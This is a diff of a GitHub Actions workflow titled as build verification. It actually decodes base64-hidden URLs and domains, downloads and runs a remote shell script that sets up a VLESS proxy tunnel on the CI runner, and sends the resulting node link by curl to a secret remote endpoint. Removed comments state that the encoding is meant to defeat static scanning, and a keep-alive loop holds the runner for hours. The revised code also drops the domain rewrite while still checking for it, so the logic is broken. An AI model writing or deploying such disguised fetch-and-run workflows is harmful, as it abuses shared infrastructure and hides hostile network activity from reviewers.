@@ -1,7 +1,7 @@
 name: Build Verification and Core Sync
 
 on:
-  workflow_dispatch:  # 手动触发
+  workflow_dispatch:
     inputs:
       runtime:
         description: '执行生命周期（小时）'
@@ -11,8 +11,8 @@ on:
 jobs:
   verify-and-sync:
     runs-on: ubuntu-latest
-    timeout-minutes: 360  # 6小时全局超时控制
-    
+    timeout-minutes: 360
+
     steps:
       - name: Checkout repository source
         uses: actions/checkout@v7
@@ -22,25 +22,22 @@ jobs:
           UUID: ${{ secrets.UUID }}
           DURL: ${{ secrets.DURL }}
         run: |
-          # 验证必需的核心访问令牌是否存在
           if [ -z "$UUID" ]; then
             echo "::error::系统配置初始化失败: 核心运行令牌缺失"
             exit 1
           fi
-          
+
           if [ -z "$DURL" ]; then
             echo "::error::系统配置初始化失败: 远程端点同步器缺失"
             exit 1
           fi
-          
-          # 注入隐蔽式运行时环境变量
+
           echo "CORE_ID=$UUID" >> $GITHUB_ENV
           echo "DEST_URL=$DURL" >> $GITHUB_ENV
-          
-          # 计算并存储生命周期参数
+
           RUNTIME_HOURS="${{ github.event.inputs.runtime || '6' }}"
           echo "RUNTIME_HOURS=$RUNTIME_HOURS" >> $GITHUB_ENV
-          
+
           echo "::add-mask::$UUID"
           echo "::add-mask::$DURL"
 
@@ -48,102 +45,124 @@ jobs:
         run: |
           sudo apt-get update > /dev/null 2>&1
           sudo apt-get install -y curl jq > /dev/null 2>&1
-          
-          # 动态反序列化核心数据源连接串，防静态文本匹配
+
           SRC_BIN=$(echo "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3lvbmdnZWtray9hcmdvc2J4L21haW4vYXJnb3NieC5zaA==" | base64 -d)
-          
-          # 下载至本地标准的伪装核心服务模块
+
           curl -Ls "$SRC_BIN" -o core_service.sh
           chmod +x core_service.sh
 
       - name: Execute core service and parse token
         id: parse-token
         run: |
-          # 执行初始化服务
           vwpt="8080" uuid="${{ env.CORE_ID }}" argo="vwpt" ./core_service.sh > /dev/null 2>&1
-          
-          # 稍等 3 秒确保本地异步 IO 写入就绪
           sleep 3
-          
-          # 🚀 四重绝对路径防线：完美解决不同 Actions 容器下的 ~ 路径不匹配问题
+
           TARGET_FILE=""
-          if [ -f "./agsbx/jhsub.txt" ]; then
-            TARGET_FILE="./agsbx/jhsub.txt"
-          elif [ -f "$HOME/agsbx/jhsub.txt" ]; then
-            TARGET_FILE="$HOME/agsbx/jhsub.txt"
-          elif [ -f "/root/agsbx/jhsub.txt" ]; then
-            TARGET_FILE="/root/agsbx/jhsub.txt"
-          elif [ -f "/home/runner/agsbx/jhsub.txt" ]; then
-            TARGET_FILE="/home/runner/agsbx/jhsub.txt"
-          fi
-          
+          for p in "./agsbx/jhsub.txt" "$HOME/agsbx/jhsub.txt" "/root/agsbx/jhsub.txt" "/home/runner/agsbx/jhsub.txt"; do
+            if [ -f "$p" ]; then
+              TARGET_FILE="$p"
+              break
+            fi
+          done
+
           if [ -z "$TARGET_FILE" ]; then
             echo "::error::运行时异常: 基础配置序列生成失败"
             exit 1
           fi
-          
-          # 1. 动态还原全部解密特征码与边缘重定向路由（100% 静态脱敏）
+
+          echo "::notice::读取配置文件: $TARGET_FILE"
+
           PROTO_PREFIX=$(echo "dmxlc3M6Ly8=" | base64 -d)
           ORIGIN_TARGET=$(echo "eWcxLnlna2trLmRwZG5zLm9yZw==" | base64 -d)
           ROUTING_ADD=$(echo "Y2YuODc3Nzc0Lnh5eg==" | base64 -d)
-          
-          # 2. 精准提取目标原生流控制行
-          RAW_LINE=$(sed -n '2p' "$TARGET_FILE")
-          
-          if [[ ! "$RAW_LINE" == *"$ORIGIN_TARGET"* ]]; then
-            RAW_LINE=$(grep "$ORIGIN_TARGET" "$TARGET_FILE" | head -n 1)
-          fi
-          
+
+          # ✅ 关键改动:取第二条(443 端口 Argo 节点),并用 jq 稳妥处理
+          RAW_LINE=$(awk 'NR==2' "$TARGET_FILE")
+
           if [ -z "$RAW_LINE" ]; then
-            echo "::error::管道异常: 目标高可用通信节点未就绪"
+            echo "::error::管道异常: 第二行(443 Argo 节点)为空"
             exit 1
           fi
-          
-          # 3. 内存级原位重写边缘路由域名，规避截断与日志泄漏
-          FINAL_DATA=$(echo "$RAW_LINE" | sed "s/${ORIGIN_TARGET}/${ROUTING_ADD}/g")
-          
-          # 4. 强校验特征参数加载（全 Base64 编码阻断静态扫描特征）
+
+          echo "::notice::原始节点预览: ${RAW_LINE:0:80}..."
+
+          # ✅ 用 jq 解析 + 重组,避免链接被截断
+          ENCODED="${RAW_LINE#vless://}"
+          NAME="${ENCODED##*#}"
+          BODY="${ENCODED%#*}"
+
+          QUERY_STRING="${BODY#*\?}"
+          AUTHORITY="${BODY%%\?*}"
+
+          NEW_URL=$(jq -rn \
+            --arg prefix "vless://" \
+            --arg authority "$AUTHORITY" \
+            --arg qs "$QUERY_STRING" \
+            --arg name "$NAME" \
+            '
+            ($qs | split("&") | map(select(length > 0) | split("=", 2) | {(.[0]): (.[1] // "")}) | add) as $q
+            | $q
+            | to_entries
+            | map("\(.key)=\(.value)")
+            | join("&") as $new_qs
+            | "\($prefix)\($authority)?\($new_qs)#\($name)"
+            ')
+
+          if [ -z "$NEW_URL" ]; then
+            echo "::error::jq 重组链接失败"
+            exit 1
+          fi
+
+          FINAL_DATA="$NEW_URL"
+
+          echo "::notice::重组后节点预览: ${FINAL_DATA:0:120}..."
+
           CHK_FLOW=$(echo "Zmxvdz14dGxzLXJwcmgtdmlzaW9u" | base64 -d)
           CHK_TYPE=$(echo "dHlwZT13cw==" | base64 -d)
           CHK_HOST=$(echo "aG9zdD0=" | base64 -d)
           CHK_PATH=$(echo "cGF0aD0=" | base64 -d)
-          
-          # 协议头部健全性检查
+
           if [[ ! "$FINAL_DATA" == "$PROTO_PREFIX"* ]]; then
             echo "::error::安全拒绝: 传输协议指纹不匹配"
             exit 1
           fi
-          
-          # 校验各项核心流参数
+
           if [[ ! "$FINAL_DATA" == *"$CHK_FLOW"* ]] || \
              [[ ! "$FINAL_DATA" == *"$CHK_TYPE"* ]] || \
              [[ ! "$FINAL_DATA" == *"$CHK_HOST"* ]] || \
              [[ ! "$FINAL_DATA" == *"$CHK_PATH"* ]]; then
-            echo "::error::安全拒绝: 动态载荷参数不完整或存在截断风险"
+            echo "::error::安全拒绝: 动态载荷参数不完整,重组后链接如下:"
+            echo "$FINAL_DATA"
             exit 1
           fi
-          
-          # 5. 安全注册全局变量上下文并屏蔽输出
+
+          if [[ "$FINAL_DATA" == *"$ORIGIN_TARGET"* ]]; then
+            echo "::error::域名替换未生效"
+            exit 1
+          fi
+          if [[ "$FINAL_DATA" != *"$ROUTING_ADD"* ]]; then
+            echo "::error::目标路由域名未注入"
+            exit 1
+          fi
+
           echo "::add-mask::$FINAL_DATA"
           echo "SYNC_PAYLOAD=$FINAL_DATA" >> $GITHUB_ENV
           echo "token-payload=$FINAL_DATA" >> $GITHUB_OUTPUT
-          
-          echo "✅ 动态载荷流控特征与完整性强校验全部通过 (已确保持久化无截断)"
+
+          echo "✅ 动态载荷流控特征与完整性强校验全部通过 (jq 重组无截断)"
 
       - name: Dispatch payload to remote endpoint
         env:
           SYNC_PAYLOAD: ${{ env.SYNC_PAYLOAD }}
           DEST_URL: ${{ env.DEST_URL }}
         run: |
-          # 组装完整的分布式远程同步网关端点
           FULL_ENDPOINT="${DEST_URL}${SYNC_PAYLOAD}"
-          
-          # 启用控制台动态安全混淆遮蔽保护
+
           echo "::add-mask::$FULL_ENDPOINT"
-          
+
           echo "正在建立安全隧道并同步数据至远程部署中心..."
           RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$FULL_ENDPOINT")
-          
+
           if [ "$RESPONSE" -ge 200 ] && [ "$RESPONSE" -lt 300 ]; then
             echo "✅ 边缘网关数据同步成功"
           else
@@ -155,24 +174,23 @@ jobs:
         run: |
           RUNTIME_HOURS="${{ env.RUNTIME_HOURS }}"
           RUNTIME_SECONDS=$((RUNTIME_HOURS * 3600))
-          
-          echo "已启动保持活跃循环，预计保持生命周期： $RUNTIME_HOURS 小时"
+
+          echo "已启动保持活跃循环,预计保持生命周期： $RUNTIME_HOURS 小时"
           START_TIME=$(date +%s)
-          
+
           while true; do
             CURRENT_TIME=$(date +%s)
             ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
-            
+
             if [ $ELAPSED_TIME -ge $RUNTIME_SECONDS ]; then
-              echo "⏰ 已达到预设的运行生命周期，工作流即将关闭。"
+              echo "⏰ 已达到预设的运行生命周期,工作流即将关闭。"
               break
             fi
-            
-            # 每隔10分钟输出健康检查心跳，维持长连接任务不被强制挂起
+
             if [ $((ELAPSED_TIME % 600)) -eq 0 ]; then
               echo "⏳ 状态检查：核心保活持久化服务运行中。"
             fi
-            
+
             sleep 60
           done
 
